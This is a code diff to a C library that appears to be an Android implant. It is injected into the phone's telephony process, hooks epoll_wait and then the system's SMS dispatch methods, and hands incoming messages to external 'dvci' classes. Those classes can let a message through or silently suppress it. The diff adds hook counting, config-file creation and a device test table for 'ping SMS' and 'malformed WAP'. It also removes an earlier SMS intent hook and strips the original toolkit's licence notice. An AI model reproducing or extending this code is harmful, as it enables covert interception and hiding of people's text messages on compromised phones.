@@ -1,10 +1,12 @@
 /*
- *  Collin's Dynamic Dalvik Instrumentation Toolkit for Android
- *  Collin Mulliner <collin[at]mulliner.org>
+ *  Started from Collin's Dynamic Dalvik Instrumentation Toolkit for Android
+ * - Tested :           ping SMS  |   malformed WAP
+ * Galaxy nexus 2 A4.3        N   |     Y
+ * Galaxy nexus 2 A4.0        N   |     N        Instrumentation on epoll_wait not working (never called)
+ * CAT B15 A4.1               N   |     Y
+ * Huawey Y530  A4.3          Y   |     Y
+ * LG G2 D802   A4.2.2        Y   |     Y
  *
- *  (c) 2012,2013
- *
- *  License: LGPL v2.1
  *
  */
 
@@ -71,11 +73,10 @@ struct dalvik_cache_t
 
 static struct hook_t eph;
 static struct dexstuff_t d;
-static struct dalvik_hook_t dpdu;
-static struct dalvik_hook_t dispatchIntent;
 static struct dalvik_hook_t processUnsolicited_dh;
 static struct dalvik_cache_t processUnsolicited_cache;
 static struct dalvik_hook_t dispatchNormalMessage;
+static char createcnf = 0;
 
 
 // switch for debug output of dalvikhook and dexstuff code
@@ -245,156 +246,7 @@ static jmethodID mid_throw_toString = NULL;
 static jclass frame_class = NULL ;
 static jmethodID mid_frame_toString = NULL;
 
-static int initialize_for_exception(JNIEnv * pEnv)
-{
 
-   throw_class = (*pEnv)->FindClass(pEnv, "java/lang/Throwable");
-   if (throw_class == NULL) {
-      log("failed to find \"java/lang/Throwable class\"");
-      return 1;
-   }
-   mid_throw_getCause = (*pEnv)->GetMethodID(pEnv,throw_class,"getCause", "()Ljava/lang/Throwable;");
-   if (mid_throw_getCause == NULL) {
-      log("failed to find \"getCause method\"");
-      throw_class = NULL;
-      return 1;
-   }
-   mid_throw_getStackTrace = (*pEnv)->GetMethodID(pEnv, throw_class,"getStackTrace","()[Ljava/lang/StackTraceElement;");
-   if (mid_throw_getStackTrace == NULL) {
-      log("failed to find \"getStackTrace method\"");
-      throw_class = NULL;
-      return 1;
-   }
-   mid_frame_toString = (*pEnv)->GetMethodID(pEnv,throw_class, "toString", "()Ljava/lang/String;");
-   if (mid_frame_toString == NULL) {
-      log("failed to find \"toString method\"");
-      throw_class = NULL;
-      return 1;
-   }
-   frame_class = (*pEnv)->FindClass(pEnv, "java/lang/StackTraceElement");
-   if (frame_class == NULL) {
-      log("failed to find \"java/lang/StackTraceElement class\"");
-      throw_class = NULL;
-      return 1;
-   }
-   mid_frame_toString = (*pEnv)->GetMethodID(pEnv, frame_class,"toString","()Ljava/lang/String;");
-   if (mid_frame_toString == NULL) {
-      log("failed to find \"frame_class->toString method\"");
-      throw_class = NULL;
-      return 1;
-   }
-   log(" initialized data for exceptions\n");
-   return 0;
-}
-static void print_exception(JNIEnv *a_jni_env, jthrowable a_exception,int a_error_msg)
-{
-   if (a_exception == NULL) {
-      log("null exception passed");
-      return;
-   }
-   if (throw_class == NULL) {
-      if (initialize_for_exception(a_jni_env)) {
-         log("initialize_for_exception, failed");
-         return;
-      }
-   }
-
-   // Get the array of StackTraceElements.
-   jobjectArray frames = (jobjectArray)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_getStackTrace);
-   jsize frames_length = 0;
-   if(frames) {
-   frames_length = (*a_jni_env)->GetArrayLength(a_jni_env, frames);
-   if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-      (*a_jni_env)->ExceptionClear(a_jni_env);
-      log("got an mid_throw_getStackTrace!!");
-      return;
-   }
-   }else{
-      log("failed to get frames!!");
-      return;
-   }
-
-   // Add Throwable.toString() before descending
-   // stack trace messages.
-   if (frames) {
-      jstring msg_obj = (jstring)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_toString);
-      if (msg_obj == NULL) {
-         log("mid_throw_toString failed");
-         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-            (*a_jni_env)->ExceptionClear(a_jni_env);
-            log("got an mid_throw_toString!!");
-         }
-         return;
-      }
-      const char* msg_str = (*a_jni_env)->GetStringUTFChars(a_jni_env, msg_obj, 0);
-      if (msg_str == NULL) {
-         log("getUTF failed");
-         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-            (*a_jni_env)->ExceptionClear(a_jni_env);
-            log("got an mid_throw_toString!!");
-         }
-         return;
-      }
-      // If this is not the top-of-the-trace then
-      // this is a cause.
-      if (a_error_msg == 0) {
-         log("\nCaused by: %s", msg_str);
-      } else {
-         log("%s", msg_str);
-         a_error_msg += 1;
-      }
-      (*a_jni_env)->ReleaseStringUTFChars(a_jni_env, msg_obj, msg_str);
-      (*a_jni_env)->DeleteLocalRef(a_jni_env, msg_obj);
-   }
-
-   // Append stack trace messages if there are any.
-   if (frames_length > 0) {
-      jsize i = 0;
-      for (i = 0; i < frames_length; i++) {
-         // Get the string returned from the 'toString()'
-         // method of the next frame and append it to
-         // the error message.
-         jobject frame = (*a_jni_env)->GetObjectArrayElement(a_jni_env, frames, i);
-         if (frame == NULL) {
-            log("get frame failed");
-            if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-               (*a_jni_env)->ExceptionClear(a_jni_env);
-               log("got an GetObjectArrayElement!!");
-            }
-            return;
-         }
-         jstring msg_obj = (jstring)(*a_jni_env)->CallObjectMethod(a_jni_env, frame, mid_frame_toString);
-         if (msg_obj == NULL) {
-            log("mid_frame_toString failed");
-            if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-               (*a_jni_env)->ExceptionClear(a_jni_env);
-               log("got an mid_frame_toString!!");
-            }
-            (*a_jni_env)->DeleteLocalRef(a_jni_env, frame);
-            return;
-         }
-         const char* msg_str = (*a_jni_env)->GetStringUTFChars(a_jni_env, msg_obj, 0);
-         log("\n        %s", msg_str);
-         (*a_jni_env)->ReleaseStringUTFChars(a_jni_env, msg_obj, msg_str);
-         (*a_jni_env)->DeleteLocalRef(a_jni_env, msg_obj);
-         (*a_jni_env)->DeleteLocalRef(a_jni_env, frame);
-         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
-            (*a_jni_env)->ExceptionClear(a_jni_env);
-            log("got an DeleteLocalRef!!");
-            return;
-         }
-      }
-   }
-
-   // If 'a_exception' has a cause then append the
-   // stack trace messages from the cause.
-   if (0 != frames) {
-      jthrowable cause = (jthrowable)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_getCause);
-      if (cause) {
-         print_exception(a_jni_env, cause, a_error_msg);
-      }
-   }
-}
 static int load_dext(char * dext_path,char **classes)
 {
 
@@ -466,6 +318,7 @@ char *classes[] = {
          "com/android/dvci/util/Check",
          "com/android/internal/telephony/GsmAlphabet",
          "com/android/dvci/util/DateTime",
+         "com/android/dvci/util/Utils",
          NULL };
 //private void processUnsolicited (Parcel p)
 static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
@@ -606,55 +459,7 @@ static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessage
    return callOrig;
 }
 
-//intent.putExtra("pdus", pdus);
-//intent.putExtra("format", tracker.getFormat());
-//        dispatchIntent(intent, android.Manifest.permission.RECEIVE_SMS,AppOpsManager.OP_RECEIVE_SMS, resultReceiver);
-static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject permission, jint app, jobject receiver)
-{
-   int callOrig = 1;
-   log("we are in!");
-   if (load_dext(dumpPath,classes)) {
-      log("failed to load class ");
-   } else {
-      // call static method and passin the sms
-      log("intent = 0x%x\n", intent)
 
-      jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
-      if (smsd) {
-         jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchIntent", "(Landroid/content/Intent;)I");
-         if (staticId) {
-            jvalue args[1];
-
-            args[0].l = intent;
-            //NativeType CallStatic<type>MethodA(JNIEnv *env, jclass clazz,jmethodID methodID, jvalue *args);
-            callOrig = (*env)->CallStaticIntMethodA(env, smsd, staticId, args);
-         } else {
-            log("method not found!\n")
-         }
-      } else {
-         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
-      }
-   }
-   // call original SMS dispatch method
-   jvalue args[4];
-   log("dalvik_prepare!\n")
-   dalvik_prepare(&d, &dispatchIntent, env);
-   log("dalvik_called\n")
-   if (callOrig) {
-      log("calling orig prepare args!\n")
-      args[0].l = intent;
-      args[1].l = permission;
-      args[2].i = app;
-      args[3].l = receiver;
-      log("args ok!\n")
-      (*env)->CallVoidMethodA(env, this, dispatchIntent.mid, args);
-      log("orig called ok!\n")
-
-   } else {
-      log("skipping message insertion : %s\n", dispatchIntent.method_name)
-   }
-   dalvik_postcall(&d, &dispatchIntent);
-}
 static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
 {
    int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
@@ -666,34 +471,41 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    dexstuff_resolv_dvm(&d);
    log("my_epoll_wait: try_hook\n")
    if( strncmp(quite_needle,arg1,strlen(quite_needle)) == 0 ){
+      int hooked = 2;
       log("hooking sms\n")
-   if (and_maj == 4){
-      //private void processUnsolicited (Parcel p) {
-      processUnsolicited_cache.cls_h = NULL;
-      processUnsolicited_cache.mid_h = NULL;
-      dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
-      if (dalvik_hook(&d, &processUnsolicited_dh)) {
-         log("my_epoll_wait: hook processUnsolicited ok\n")
-      } else {
-         log("my_epoll_wait: hook processUnsolicited fails\n")
-      }
-      if ( and_min < 4) {
-         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
-         if (dalvik_hook(&d, &dispatchNormalMessage)) {
-            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
+      if (and_maj == 4){
+         //private void processUnsolicited (Parcel p) {
+         processUnsolicited_cache.cls_h = NULL;
+         processUnsolicited_cache.mid_h = NULL;
+         dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
+         if (dalvik_hook(&d, &processUnsolicited_dh)) {
+            log("my_epoll_wait: hook processUnsolicited ok\n");
+            hooked--;
          } else {
-            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
+            log("my_epoll_wait: hook processUnsolicited fails\n");
          }
-      } else if (and_min >= 4) {
+         if ( and_min < 4) {
+            dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
+            if (dalvik_hook(&d, &dispatchNormalMessage)) {
+               log("my_epoll_wait: hook dispatchNormalMessage ok\n");
+               hooked--;
+            } else {
+               log("my_epoll_wait: hook dispatchNormalMessage fails\n");
+            }
+         } else if (and_min >= 4) {
 
-         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
-         if (dalvik_hook(&d, &dispatchNormalMessage)) {
-            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
-         } else {
-            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
+            dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
+            if (dalvik_hook(&d, &dispatchNormalMessage)) {
+               log("my_epoll_wait: hook dispatchNormalMessage ok\n");
+               hooked--;
+            } else {
+               log("my_epoll_wait: hook dispatchNormalMessage fails\n");
+            }
+
          }
-
-      }
+         if( hooked == 0 && createcnf){
+            create_cnf();
+         }
    } else {
       log("injection not possible \n");
       return 1;
@@ -717,6 +529,7 @@ void create_cnf()
       if (fd > 0) {
          log("create_cnf: wrote log file %s fd %d\n", full_path_log_filename, fd);
          close(fd);
+         createcnf = 0;
       }else{
          log("create_cnf: open failed with file %s",full_path_log_filename);
       }
@@ -749,7 +562,7 @@ void __attribute__ ((constructor)) my_init(void);
 
 void my_init(void)
 {
-   char createcnf = 0;
+
    char *lastAt = NULL;
    log("started\n");
    get_android_version();
@@ -804,10 +617,18 @@ void my_init(void)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
    dalvikhook_set_logfunction(my_log2);
+   /*
+   if (and_maj == 4 && and_min == 0){
+      if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0) && createcnf==1){
+               log("my_init: epoll_wait hooked\n");
+       }
+   }else{
+   */
+      if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0) && createcnf==1){
+         log("my_init: epoll_wait hooked\n");
+      }
+   //}
 
-   if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0) && createcnf==1){
-      create_cnf();
-   }
    dexstuff_resolv_dvm(&d);
    //log("my_init: printClass\n");
    //dalvik_dump_class(&d,"");
